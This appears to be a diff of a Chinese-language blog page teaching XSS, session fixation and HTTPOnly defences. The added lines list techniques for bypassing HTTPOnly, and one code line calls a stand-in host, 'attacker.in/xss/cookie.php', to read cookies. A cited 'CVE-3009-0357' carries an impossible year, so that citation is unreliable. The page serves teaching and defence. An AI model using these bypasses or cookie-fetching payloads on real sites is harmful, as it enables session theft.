@@ -104,7 +104,7 @@
 <meta property="og:site_name" content="Emerald Dream">
 <meta property="og:description" content="XSS(Cross-Site script)跨站脚本攻击。XSS最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。是一种经常出现再web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-07-01T12:28:07.772Z">
+<meta property="og:updated_time" content="2019-07-05T13:23:44.399Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;XSS&#39;">
 <meta name="twitter:description" content="XSS(Cross-Site script)跨站脚本攻击。XSS最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。是一种经常出现再web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗">
@@ -335,7 +335,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="chessur">
-      <meta itemprop="description" content="Stay Hungry.<br>Stay Foolish.">
+      <meta itemprop="description" content="Freedom as Autonomy">
       <meta itemprop="image" content="/images/cat.jpg">
     </span>
 
@@ -391,11 +391,29 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-01 20:28:07" itemprop="dateModified" datetime="2019-07-01T20:28:07+08:00">2019-07-01</time>
+                <time title="Modified: 2019-07-05 21:23:44" itemprop="dateModified" datetime="2019-07-05T21:23:44+08:00">2019-07-05</time>
               
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/OWASP-TOP10/" itemprop="url" rel="index"><span itemprop="name">OWASP-TOP10</span></a></span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -443,7 +461,7 @@
 <h2 id="1-4-会话固定"><a href="#1-4-会话固定" class="headerlink" title="1.4 会话固定"></a>1.4 会话固定</h2><p>会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。</p>
 <h3 id="1-4-1-攻击步骤"><a href="#1-4-1-攻击步骤" class="headerlink" title="1.4.1 攻击步骤"></a>1.4.1 攻击步骤</h3><p>1.攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；<br>2.目标用户携带攻击者设定的Session ID登录站点；<br>3.攻击者通过Session ID获得合法会话</p>
 <h2 id="1-5-攻击者重置SessionID的方式"><a href="#1-5-攻击者重置SessionID的方式" class="headerlink" title="1.5 攻击者重置SessionID的方式"></a>1.5 攻击者重置SessionID的方式</h2><p>重置Session ID的方法同样也有多种，可以是跨站脚本攻击，如果是URL传递Session ID，还可以通过诱导的方式重置该参数，比如可以通过邮件的方式诱导用户去点击重置Session ID的URL，使用Cookie传递可以避免这种攻击.使用Cookie来存放Session ID，攻击者可以在以下三种可用的方法中选择一种来重置Session ID。</p>
-<p>1.使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如document.cookie=”sessionid=123”，这种方式可以采用跨站脚本攻击来达到目的。防御方式可以是设置HttpOnly属性，但有少数低版本浏览器存在漏洞，即使设置了HttpOnly，也可以重写Cookie。所以还需要加其他方式的校验，如User-Agent验证，Token校验等同样有效。<br>2.使用HTML的\<meta>标签加Set-Cookie属性。服务器可以靠在返回的HTML文档中增加\<meta>标签来设置Cookie。例如<meta http-equiv="Set-Cookiecontent=”sessionid=123”">，与客户端脚本相比，对\<meta>标签的处理目前还不能被浏览器禁止。<br>3.使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部。</p>
+<p>1.使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如document.cookie=”sessionid=123”，这种方式可以采用跨站脚本攻击来达到目的。防御方式可以是设置HttpOnly属性，但有少数低版本浏览器存在漏洞，即使设置了HttpOnly，也可以重写Cookie。所以还需要加其他方式的校验，如User-Agent验证，Token校验等同样有效。<br>2.使用HTML的\<meta>标签加Set-Cookie属性。服务器可以靠在返回的HTML文档中增加\<meta>标签来设置Cookie。例如<meta http-equiv="Set-Cookiecontent=”sessionid=123”">，与客户端脚本相比，对\<meta>标签的处理目前还不能被浏览器禁止。<br>3.使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部。</p>
 <h2 id="1-6-会话劫持防御方法"><a href="#1-6-会话劫持防御方法" class="headerlink" title="1.6 会话劫持防御方法"></a>1.6 会话劫持防御方法</h2><p>1.用户登录时生成新的Session ID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。<br>2.大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。<br>3.更改session的名称：session的默认名称是PHPSESSID,此变量会保存在cookie中，如果黑客不抓包分析，就不能猜到这个名称，阻挡部分攻击。</p>
 <h2 id="1-7-JavaScript-事件"><a href="#1-7-JavaScript-事件" class="headerlink" title="1.7 JavaScript 事件"></a>1.7 JavaScript 事件</h2><table>
 <thead>
@@ -551,10 +569,22 @@
 <h1 id="4-XSS的危害"><a href="#4-XSS的危害" class="headerlink" title="4. XSS的危害"></a>4. XSS的危害</h1><p>1.网络钓鱼，包括盗取各类的用户账号<br>2.窃取用户cookie<br>3.窃取用户浏览会话<br>4.强制弹出广告页面、刷流量<br>5.网页挂马<br>6.提升用户权限，进一步渗透网站<br>7.传播跨站脚本蠕虫</p>
 <h1 id="5-防御XSS"><a href="#5-防御XSS" class="headerlink" title="5. 防御XSS"></a>5. 防御XSS</h1><h2 id="5-1-转义"><a href="#5-1-转义" class="headerlink" title="5.1 转义"></a>5.1 转义</h2><p>htmlspecialchars()函数把一些预定义的字符转换为HTML实体。<br>预定义字符：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号）成为 &amp;amp;</span><br><span class="line">&quot; （双引号）成为 &amp;quot;</span><br><span class="line">&apos; （单引号）成为 &amp;#39</span><br><span class="line">&lt; （小于）成为 &amp;lt;</span><br><span class="line">&gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>
-<h2 id="5-2-HTTPOnly"><a href="#5-2-HTTPOnly" class="headerlink" title="5.2 HTTPOnly"></a>5.2 HTTPOnly</h2><p>在php.ini中设置</p>
+<h2 id="5-2-HTTPOnly"><a href="#5-2-HTTPOnly" class="headerlink" title="5.2 HTTPOnly"></a>5.2 HTTPOnly</h2><p>HTTPOnly是指仅在HTTP层面上传输Cookie，当设置HTTPOnly标志后，客户端脚本就无法读写该Cookie。</p>
+<p>在php.ini中设置</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly =</span><br></pre></td></tr></table></figure>
 <p>Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);  </span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>HTTPOnly绕过</p>
+<p>1.PHPinfo信息</p>
+<p>phpinfo页面可以包含Cookie信息，同样存在HTTPOnly Cookie</p>
+<p>2.支持TRACE方法的服务器</p>
+<p>Apache支持的一个Header是TRACE，TRACE一般是用于调试，他会将请求头作为HTTP Response Body返回。利用这个特性，可以把HttpOnly Cookie读出来。不过目前各厂商已经禁止通过Ajax发送TRACE请求。</p>
+<p>3.Django等一些web框架的调试页面</p>
+<p>开启了调试模式的一些框架，会将程序的信息输出，其中就有Cookie信息。</p>
+<p>4.CVE-3009-0357</p>
+<p>Firefox &lt;= 1.9.1在处理HttpOnly Cookies时存在bug，通过getResponseHeader()得不到HttpOnly Cookie，但是通过getAllResponseHeaders()可以得到。</p>
+<p>5.Java getHeaderField</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(new java.net.URL(&apos;http://attacker.in/xss/cookie.php&apos;).openConnection().getHeaderField(&apos;set-cookie&apos;));</span><br></pre></td></tr></table></figure>
 <h2 id="5-3-输入过滤"><a href="#5-3-输入过滤" class="headerlink" title="5.3 输入过滤"></a>5.3 输入过滤</h2><p>（1）验证输入</p>
 <p>比如一个输入框，需要我们输入电话号码，电话号码必须是数字格式，有一定的长度，可以使用正则匹配 reg = /^020-\d{8}$/ </p>
 <p>常见的检测和过滤：</p>
@@ -715,7 +745,7 @@
               <img class="site-author-image" itemprop="image" src="/images/cat.jpg" alt="chessur">
             
               <p class="site-author-name" itemprop="name">chessur</p>
-              <div class="site-description motion-element" itemprop="description">Stay Hungry.<br>Stay Foolish.</div>
+              <div class="site-description motion-element" itemprop="description">Freedom as Autonomy</div>
           </div>
 
           
@@ -746,7 +776,15 @@
                     
                       
                     
-                    <span class="site-state-item-count">2</span>
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -771,7 +809,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">4</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
